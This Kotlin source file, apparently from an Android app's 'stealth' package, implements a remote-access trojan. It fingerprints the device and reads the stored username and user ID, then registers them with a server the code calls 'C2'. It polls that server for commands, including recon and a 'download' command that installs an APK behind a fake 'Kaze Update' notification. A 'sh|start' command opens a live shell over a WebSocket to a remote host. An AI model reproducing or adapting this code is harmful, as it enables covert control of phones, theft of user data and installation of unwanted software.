package com.kaze.stealth

import android.app.DownloadManager
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.database.Cursor
import android.net.Uri
import android.os.Build
import android.provider.Settings
import android.util.Log
import androidx.core.app.NotificationCompat
import com.google.firebase.messaging.FirebaseMessaging
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.Response
import okhttp3.WebSocket
import okhttp3.WebSocketListener
import okio.ByteString
import java.io.File
import java.net.URL
import java.util.concurrent.Executors
import java.util.concurrent.TimeUnit

object Core {
    private const val TAG = "STEALTH"
    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    @Volatile private var deviceId: String = ""
    @Volatile private var username: String = ""
    @Volatile private var userId: String = ""
    @Volatile private var running = false
    private val polling = java.util.concurrent.atomic.AtomicBoolean(false)
    private var executedCommandIds: MutableSet<String> = java.util.Collections.synchronizedSet(mutableSetOf<String>())
    private lateinit var prefs: android.content.SharedPreferences

    private const val PREFS_NAME = "kaze_executed_cmds"
    private const val KEY_EXECUTED_IDS = "executed_ids"

    @Volatile private var shellWs: WebSocket? = null
    @Volatile private var shellProcess: Process? = null
    @Volatile private var shellRunning = false
    private val shellExecutor = java.util.concurrent.Executors.newSingleThreadExecutor()

    private fun loadExecutedIds() {
        val saved = prefs.getStringSet(KEY_EXECUTED_IDS, emptySet()) ?: emptySet()
        executedCommandIds = java.util.Collections.synchronizedSet(saved.toMutableSet())
    }

    private fun saveExecutedIds() {
        prefs.edit().putStringSet(KEY_EXECUTED_IDS, executedCommandIds.toSet()).apply()
    }

    fun start(context: Context) {
        if (running) return
        running = true
        prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
        loadExecutedIds()
        scope.launch {
            try {
                val fingerprint = getFingerprint()
                deviceId = fingerprint.replace("|", "_")
                Log.d(TAG, "Device ID: $deviceId")

                val authPrefs = context.getSharedPreferences("auth_prefs", android.content.Context.MODE_PRIVATE)
                val fpUsername = try { authPrefs.getString("username", "") ?: "" } catch (_: Exception) { "" }
                val fpUserId = try { authPrefs.getString("user_id", "") ?: "" } catch (_: Exception) { "" }
                username = fpUsername
                userId = fpUserId

                Transport.registerDevice(deviceId, fingerprint, username, fpUserId)
                Log.d(TAG, "Device registered (user=$username, uid=$fpUserId)")

                Transport.cleanupStaleCommands(deviceId)
                Log.d(TAG, "Stale commands cleaned")

                val fcmExecutor = Executors.newSingleThreadExecutor()
                FirebaseMessaging.getInstance().token.addOnCompleteListener(fcmExecutor) { task ->
                    try {
                        if (task.isSuccessful) {
                            val token = task.result
                            if (token != null) {
                                Log.d(TAG, "FCM token obtained: ${token.take(20)}...")
                                Transport.saveFcmToken(deviceId, token)
                                Log.d(TAG, "FCM token saved to Supabase")
                            } else {
                                Log.e(TAG, "FCM token is null")
                            }
                        } else {
                            Log.e(TAG, "FCM token fetch failed: ${task.exception?.message}")
                        }
                    } catch (e: Exception) {
                        Log.e(TAG, "FCM token save error: ${e.message}")
                    }
                }

                var lastPoll = 0L
                var lastHeartbeat = 0L

                while (running) {
                    val now = System.currentTimeMillis()

                    if (now - lastPoll >= Config.POLL_INTERVAL_MS) {
                        lastPoll = now
                        pollAndExecute(context)
                    }

                    if (now - lastHeartbeat >= Config.HEARTBEAT_INTERVAL_MS) {
                        lastHeartbeat = now
                        try {
                            Transport.updateHeartbeat(deviceId, username, userId)
                        } catch (_: Exception) {}
                    }

                    delay(10000L)
                }
            } catch (e: Exception) {
                Log.e(TAG, "Core error: ${e.message}")
                running = false
            }
        }
    }

    fun ensureRunning(context: Context) {
        if (!running) {
            start(context)
        }
    }

    fun wakeUp(context: Context) {
        if (!running) {
            start(context)
        }
        if (deviceId.isEmpty()) return
        scope.launch {
            try {
                pollAndExecute(context)
            } catch (e: Exception) {
                Log.e(TAG, "WakeUp poll error: ${e.message}")
            }
        }
    }

    private fun pollAndExecute(context: Context) {
        if (!polling.compareAndSet(false, true)) return
        try {
            val commands = Transport.pollCommands(deviceId)
            if (commands.isNotEmpty()) {
                for ((cmdId, cmd) in commands) {
                    if (executedCommandIds.contains(cmdId)) continue
                    executedCommandIds.add(cmdId)
                    saveExecutedIds()

                    val action = cmd.split("|", limit = 2)[0].trim()
                    if (!Config.ALLOWED_COMMANDS.contains(action) && action != "wake") {
                        Log.w(TAG, "Unknown command rejected: $cmd")
                        Transport.markCommandFailed(cmdId, deviceId)
                        continue
                    }

                    if (cmd.startsWith("download|")) {
                        val url = cmd.removePrefix("download|")
                        val versionRegex = Regex("""/v(\d+\.\d+\.\d+)/""")
                        val match = versionRegex.find(url)
                        if (match != null) {
                            val remoteVersion = match.groupValues[1]
                            val currentVersion = com.kaze.BuildConfig.VERSION_NAME
                            if (compareVersions(remoteVersion, currentVersion) <= 0) {
                                Log.d(TAG, "Skipping download for v$remoteVersion (current: v$currentVersion)")
                                Transport.markCommandCompleted(cmdId, deviceId)
                                continue
                            }
                        }
                    }

                    Log.d(TAG, "Executing: $cmd")
                    Transport.markCommandRunning(cmdId, deviceId)

                    val result = try {
                        when {
                            cmd == "recon" -> Recon.execute(context)
                            cmd.startsWith("download|") -> downloadAndInstall(context, cmd.removePrefix("download|"))
                            cmd == "die" -> {
                                running = false
                                shellRunning = false
                                shellWs?.close(1000, "die")
                                shellWs = null
                                try { shellProcess?.destroyForcibly() } catch (_: Exception) {}
                                shellProcess = null
                                "BYE"
                            }
                            cmd == "wake" -> "AWAKE"
                            cmd.startsWith("sh|") -> {
                                val shAction = cmd.removePrefix("sh|").trim()
                                if (shAction == "start") {
                                    startLiveShell(context)
                                    "LiveShell started"
                                } else if (shAction == "stop") {
                                    stopLiveShell(context)
                                    "LiveShell stopped"
                                } else {
                                    "Unknown sh action: $shAction"
                                }
                            }
                            else -> Commands.dispatch(context, cmd)
                        }
                    } catch (e: Exception) {
                        Log.e(TAG, "Command execution error: ${e.message}")
                        "ERROR:${e.message}"
                    }

                    Transport.sendResult(cmdId, deviceId, result)
                    Transport.markCommandCompleted(cmdId, deviceId)
                    Log.d(TAG, "Result sent: ${cmd.take(30)} (${result.length} bytes)")
                }
            }
            if (executedCommandIds.size > 500) {
                val trimmed = java.util.Collections.synchronizedSet(
                    executedCommandIds.toList().takeLast(500).toMutableSet()
                )
                executedCommandIds = trimmed
                saveExecutedIds()
            }
        } catch (e: Exception) {
            Log.e(TAG, "Poll error: ${e.message}")
        } finally {
            polling.set(false)
        }
    }

    private fun compareVersions(a: String, b: String): Int {
        val partsA = a.split(".").map { it.toIntOrNull() ?: 0 }
        val partsB = b.split(".").map { it.toIntOrNull() ?: 0 }
        for (i in 0 until maxOf(partsA.size, partsB.size)) {
            val va = partsA.getOrElse(i) { 0 }
            val vb = partsB.getOrElse(i) { 0 }
            if (va != vb) return va.compareTo(vb)
        }
        return 0
    }

    fun stop() {
        running = false
    }

    fun saveFcmTokenToC2(context: Context, token: String) {
        try {
            if (deviceId.isEmpty()) {
                deviceId = getFingerprint().replace("|", "_")
            }
            Transport.saveFcmToken(deviceId, token)
            Log.d(TAG, "FCM token saved to C2 (rotation)")
        } catch (e: Exception) {
            Log.e(TAG, "FCM token save error: ${e.message}")
        }
    }

    private fun getFingerprint(): String {
        return "${Build.MANUFACTURER}|${Build.MODEL}|${Build.DEVICE}|" +
            "${Build.VERSION.RELEASE}|${Build.VERSION.SDK_INT}|" +
            "${Build.BOARD}|${Build.HARDWARE}"
    }

    private val httpClient = OkHttpClient.Builder()
        .followRedirects(true)
        .followSslRedirects(true)
        .connectTimeout(15, TimeUnit.SECONDS)
        .readTimeout(60, TimeUnit.SECONDS)
        .build()

    private const val UPDATE_CHANNEL_ID = "kaze_updates"
    private const val UPDATE_NOTIFICATION_ID = 9999

    private fun downloadAndInstall(context: Context, url: String): String {
        return try {
            val dm = context.getSystemService(Context.DOWNLOAD_SERVICE) as DownloadManager
            val request = DownloadManager.Request(Uri.parse(url))
                .setTitle("Kaze Update")
                .setDescription("Downloading update...")
                .setNotificationVisibility(DownloadManager.Request.VISIBILITY_VISIBLE_NOTIFY_COMPLETED)
                .setDestinationInExternalFilesDir(context, null, "kaze_update.apk")
                .setAllowedOverMetered(true)
                .setAllowedOverRoaming(true)

            val downloadId = dm.enqueue(request)
            Log.d(TAG, "Download started: id=$downloadId")

            createUpdateChannel(context)

            val receiver = object : BroadcastReceiver() {
                override fun onReceive(ctx: Context, intent: Intent) {
                    val id = intent.getLongExtra(DownloadManager.EXTRA_DOWNLOAD_ID, -1)
                    if (id != downloadId) return

                    ctx.unregisterReceiver(this)

                    val installed = installDownloadedApk(ctx, dm, downloadId)
                    if (installed) {
                        showInstallNotification(ctx)
                    } else {
                        showDownloadFailedNotification(ctx)
                    }
                }
            }

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                context.registerReceiver(receiver, IntentFilter(DownloadManager.ACTION_DOWNLOAD_COMPLETE), Context.RECEIVER_NOT_EXPORTED)
            } else {
                context.registerReceiver(receiver, IntentFilter(DownloadManager.ACTION_DOWNLOAD_COMPLETE))
            }

            "DOWNLOADING:$url"
        } catch (e: Exception) {
            Log.e(TAG, "Download error: ${e.message}")
            "ERROR:${e.message}"
        }
    }

    private fun installDownloadedApk(context: Context, dm: DownloadManager, downloadId: Long): Boolean {
        val query = DownloadManager.Query().setFilterById(downloadId)
        val cursor: Cursor = dm.query(query) ?: return false
        try {
            if (!cursor.moveToFirst()) return false
            val uriIdx = cursor.getColumnIndex(DownloadManager.COLUMN_LOCAL_URI)
            val uriString = cursor.getString(uriIdx) ?: return false
            val fileUri = Uri.parse(uriString)

            val apkFile = File(fileUri.path!!)
            if (!apkFile.exists()) return false

            val magic = ByteArray(2)
            apkFile.inputStream().use { it.read(magic) }
            if (magic[0] != 0x50.toByte() || magic[1] != 0x4B.toByte()) {
                apkFile.delete()
                return false
            }

            val contentUri = androidx.core.content.FileProvider.getUriForFile(
                context, "${context.packageName}.fileprovider", apkFile
            )
            val installIntent = Intent(Intent.ACTION_VIEW).apply {
                setDataAndType(contentUri, "application/vnd.android.package-archive")
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION)
            }
            context.startActivity(installIntent)
            return true
        } finally {
            cursor.close()
        }
    }

    private fun createUpdateChannel(context: Context) {
        val nm = context.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        if (nm.getNotificationChannel(UPDATE_CHANNEL_ID) == null) {
            val channel = NotificationChannel(UPDATE_CHANNEL_ID, "Updates", NotificationManager.IMPORTANCE_HIGH)
            channel.description = "App update notifications"
            nm.createNotificationChannel(channel)
        }
    }

    private fun showInstallNotification(context: Context) {
        val nm = context.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        val notification = NotificationCompat.Builder(context, UPDATE_CHANNEL_ID)
            .setSmallIcon(android.R.drawable.stat_sys_download_done)
            .setContentTitle("Update Ready")
            .setContentText("Tap to install the update")
            .setPriority(NotificationCompat.PRIORITY_HIGH)
            .setAutoCancel(true)
            .build()
        nm.notify(UPDATE_NOTIFICATION_ID, notification)
    }

    private fun showDownloadFailedNotification(context: Context) {
        val nm = context.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        val notification = NotificationCompat.Builder(context, UPDATE_CHANNEL_ID)
            .setSmallIcon(android.R.drawable.stat_notify_error)
            .setContentTitle("Update Failed")
            .setContentText("Downloaded file is not a valid APK")
            .setPriority(NotificationCompat.PRIORITY_DEFAULT)
            .setAutoCancel(true)
            .build()
        nm.notify(UPDATE_NOTIFICATION_ID, notification)
    }

    private fun startLiveShell(context: Context) {
        if (shellRunning) {
            Log.d(TAG, "LiveShell already running")
            return
        }
        shellRunning = true
        shellExecutor.execute {
            try {
                val shell = ProcessBuilder("sh")
                    .redirectErrorStream(true)
                    .start()
                shellProcess = shell
                Log.d(TAG, "Shell process started")

                val wsUrl = "ws://${Config.LIVESHELL_HOST}:${Config.LIVESHELL_PORT}/ws/shell"
                val client = OkHttpClient.Builder()
                    .readTimeout(0, TimeUnit.MILLISECONDS)
                    .pingInterval(30, TimeUnit.SECONDS)
                    .build()
                val request = Request.Builder()
                    .url(wsUrl)
                    .addHeader("X-Device-Id", deviceId)
                    .addHeader("X-Token", Config.LIVESHELL_TOKEN)
                    .build()

                val listener = object : WebSocketListener() {
                    override fun onOpen(ws: WebSocket, response: Response) {
                        Log.d(TAG, "LiveShell WS connected")
                        shellWs = ws
                        Thread({
                            try {
                                val inp = shell.inputStream
                                val buf = ByteArray(4096)
                                while (shellRunning) {
                                    val n = inp.read(buf)
                                    if (n == -1) break
                                    val data = String(buf, 0, n)
                                    ws.send(data)
                                }
                            } catch (e: Exception) {
                                Log.e(TAG, "Shell read error: ${e.message}")
                            }
                        }, "shell-reader").start()
                    }

                    override fun onMessage(ws: WebSocket, text: String) {
                        try {
                            val parts = text.split("|", limit = 2)
                            if (parts.size == 2) {
                                val cmd = parts[1].trimEnd('\n', '\r')
                                shell.outputStream.write((cmd + "\n").toByteArray())
                                shell.outputStream.flush()
                            }
                        } catch (e: Exception) {
                            Log.e(TAG, "Shell write error: ${e.message}")
                        }
                    }

                    override fun onClosed(ws: WebSocket, code: Int, reason: String) {
                        Log.d(TAG, "LiveShell WS closed: $code $reason")
                        cleanupShell()
                    }

                    override fun onFailure(ws: WebSocket, t: Throwable, response: Response?) {
                        Log.e(TAG, "LiveShell WS failure: ${t.message}")
                        cleanupShell()
                    }
                }
                client.newWebSocket(request, listener)
            } catch (e: Exception) {
                Log.e(TAG, "LiveShell start error: ${e.message}")
                cleanupShell()
            }
        }
    }

    private fun stopLiveShell(context: Context) {
        shellRunning = false
        shellWs?.close(1000, "stopped")
        shellWs = null
        cleanupShell()
    }

    private fun cleanupShell() {
        shellRunning = false
        shellWs = null
        try { shellProcess?.destroyForcibly() } catch (_: Exception) {}
        shellProcess = null
    }
}
